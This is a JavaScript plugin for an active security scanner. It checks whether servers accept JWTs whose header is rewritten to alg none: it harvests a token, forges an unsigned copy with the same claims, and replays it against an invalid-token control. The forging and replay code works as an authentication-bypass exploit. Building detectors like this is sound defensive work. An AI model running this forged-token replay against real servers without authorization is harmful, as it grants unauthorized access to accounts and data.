/* ---
id: jwt-none-alg-bypass
name: JWT alg:none Acceptance (active proof)
description: Detects servers that accept a JWT whose header was rewritten to alg none, by re-signing a discovered token with an empty signature and comparing the response against an invalid-token control over three repeats.
author: GASH contributors
severity: critical
tags: [jwt, authentication, auth-bypass, differential]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 16
phase: probe
order: 84
api_version: "1.0"
tests: tests/fixtures/jwt-none-alg-bypass/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/jwt/jwt-none-alg-bypass.js
// What: Tier 2 active JWT alg:none acceptance plugin.
// Why: The passive JWT plugins read a token and grade its header; only an
//   active request can prove the server actually accepts an unsigned token.
//   The plugin discovers a token from a read, rewrites the header segment to
//   {"alg":"none"} while keeping the original claims, drops the signature, and
//   replays it. Forged vs invalid vs anonymous is the differential triple: a
//   server that enforces the algorithm answers all three identically and
//   rejects; a server that trusts alg:none serves authenticated content to the
//   forged token and confirms. No signing key is needed and nothing is decoded
//   beyond locating the two segment separators.

// b64url encodes a short ASCII string as unpadded base64url.
// What: Local encoder so the plugin needs no btoa/atob in the sandbox.
// Why: The rewritten header is the only value that must be encoded.
function b64url(input) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
  let out = "";
  let i = 0;
  while (i < input.length) {
    const b0 = input.charCodeAt(i) & 0xff;
    const hasB1 = i + 1 < input.length;
    const hasB2 = i + 2 < input.length;
    const b1 = hasB1 ? input.charCodeAt(i + 1) & 0xff : 0;
    const b2 = hasB2 ? input.charCodeAt(i + 2) & 0xff : 0;
    out += chars.charAt(b0 >> 2);
    if (!hasB1) {
      out += chars.charAt((b0 & 0x03) << 4);
      break;
    }
    out += chars.charAt(((b0 & 0x03) << 4) | (b1 >> 4));
    if (!hasB2) {
      out += chars.charAt((b1 & 0x0f) << 2);
      break;
    }
    out += chars.charAt(((b1 & 0x0f) << 2) | (b2 >> 6));
    out += chars.charAt(b2 & 0x3f);
    i += 3;
  }
  return out;
}

// isTokenChar reports whether ch can appear in a JWT's base64url segments.
function isTokenChar(ch) {
  return (
    (ch >= "A" && ch <= "Z") ||
    (ch >= "a" && ch <= "z") ||
    (ch >= "0" && ch <= "9") ||
    ch === "_" ||
    ch === "-" ||
    ch === "."
  );
}

// pickToken returns tok when it is shaped like a JWT (two dots, JSON header).
function pickToken(tok) {
  if (!tok || tok.length < 20) {
    return "";
  }
  const first = tok.indexOf(".");
  if (first <= 0) {
    return "";
  }
  const second = tok.indexOf(".", first + 1);
  if (second <= first + 1) {
    return "";
  }
  // A JWT header is base64url of a JSON object, so it starts with "eyJ".
  if (tok.charAt(0) !== "e" || tok.charAt(1) !== "y" || tok.charAt(2) !== "J") {
    return "";
  }
  return tok;
}

// findJWT scans free text for the first JWT-shaped run of token characters.
function findJWT(text) {
  if (!text) {
    return "";
  }
  const s = String(text);
  let cur = "";
  for (let i = 0; i < s.length; i++) {
    const ch = s.charAt(i);
    if (isTokenChar(ch)) {
      cur += ch;
      continue;
    }
    const hit = pickToken(cur);
    if (hit) {
      return hit;
    }
    cur = "";
  }
  return pickToken(cur);
}

// jwtFromResponse looks for a token in the body and then in every header value.
function jwtFromResponse(resp) {
  if (!resp) {
    return "";
  }
  const fromBody = findJWT(resp.body);
  if (fromBody) {
    return fromBody;
  }
  const headers = resp.headers || {};
  for (const key in headers) {
    if (!Object.prototype.hasOwnProperty.call(headers, key)) {
      continue;
    }
    const hit = findJWT(headers[key]);
    if (hit) {
      return hit;
    }
  }
  return "";
}

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const candidates = [];
  const repeats = 3;
  const maxSends = 16;
  const invalidToken = "gash-invalid-token-0f3a";
  let sends = 0;
  const seen = {};

  for (const point of points) {
    if (sends + 8 > maxSends) {
      break;
    }
    const base = String(point.url || "").split("#")[0];
    if (!base || seen[base]) {
      continue;
    }
    seen[base] = true;
    const get = (headers) => ({
      url: base,
      method: "GET",
      paramName: "",
      paramLocation: "query",
      value: "",
      headers: headers || {},
    });

    // Discovery read: does this endpoint hand out a JWT at all?
    sends++;
    const discovery = probe.send(get({}));
    const token = jwtFromResponse(discovery);
    if (!token) {
      continue; // no token to attack: skip honestly instead of guessing
    }
    const first = token.indexOf(".");
    const second = token.indexOf(".", first + 1);
    const payloadSegment = token.slice(first + 1, second);
    if (!payloadSegment) {
      continue;
    }
    // Keep the original claims, replace the header with alg:none, drop the
    // signature by leaving the third segment empty.
    const forged = b64url('{"alg":"none","typ":"JWT"}') + "." + payloadSegment + ".";

    const forgedResps = [];
    const invalidResps = [];
    for (let i = 0; i < repeats; i++) {
      sends++;
      forgedResps.push(probe.send(get({ "Authorization": "Bearer " + forged })));
      sends++;
      invalidResps.push(probe.send(get({ "Authorization": "Bearer " + invalidToken })));
    }
    sends++;
    const controlResp = probe.send(get({}));
    const ev = host.oracles.differential(forgedResps, invalidResps, controlResp, {
      confidence_ceiling: "confirmed",
    });
    if (ev) {
      candidates.push(host.candidate(point, "differential", ev));
    }
  }
  return candidates;
}
